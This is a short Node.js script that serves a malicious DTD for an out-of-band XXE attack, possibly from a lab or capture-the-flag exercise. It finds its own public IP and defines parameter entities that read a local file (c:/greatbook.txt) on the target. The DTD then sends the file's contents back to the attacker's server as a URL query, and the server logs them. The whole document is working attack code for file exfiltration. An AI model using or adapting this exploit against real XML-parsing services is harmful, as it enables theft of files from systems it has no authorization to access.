// Serves a dtd blob for all urls, logging request urls
// `$ node index.js`

const http = require('http');
const fs = require('fs')

const PORT = 4000;

http.get('http://httpbin.org/ip', (res) => {
    let rawData = '';
    res.on('data', (chunk) => { rawData += chunk; });
    res.on('end', () => {
      let ip_addr = JSON.parse(rawData)['origin'];

      const dtd = `<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % stolendata SYSTEM "file:///c:/greatbook.txt">
<!ENTITY % inception "<!ENTITY &#x25; sendit SYSTEM 'http://${ip_addr}:${PORT}/?%stolendata;'>">`
      
      http.createServer((req, res) => {
          console.log(req.socket.remoteAddress, req.url);
          res.write(dtd);
          res.end();
      }).listen(4000);
      
      console.log(`Listening on http://${ip_addr}:${PORT}/`);
      console.log("Serving:")
      console.log(dtd);
    });
});
